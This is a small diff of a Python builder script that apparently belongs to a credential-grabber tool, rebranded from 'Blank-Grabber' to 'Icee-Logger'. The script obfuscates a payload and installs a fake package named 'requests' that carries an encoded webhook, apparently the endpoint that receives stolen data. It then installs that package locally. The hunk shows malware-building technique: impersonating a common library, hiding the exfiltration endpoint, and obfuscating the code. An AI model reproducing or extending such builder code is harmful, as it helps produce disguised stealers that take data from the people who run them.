@@ -16,6 +16,6 @@ with open("webhook.txt") as webhook:
 subprocess.run("python obf.py -o main-o.py main-o.py", shell= True, capture_output= True)
 
 with open("./fake-module/requests/__init__.py", "w", encoding= "utf-8") as file:
-    file.write(f'__author__ = "Blank-c"\n__github__ = "https://github.com/Blank-c/Blank-Grabber"\nWEBHOOK = "{base64.b85encode(hook.encode()).decode()}"')
+    file.write(f'__author__ = "iceeburr"\n__github__ = "https://github.com/iceeburr/Icee-Logger"\nWEBHOOK = "{base64.b85encode(hook.encode()).decode()}"')
 
 subprocess.run("pip install -e .", shell= True, capture_output= True, cwd= "./fake-module")
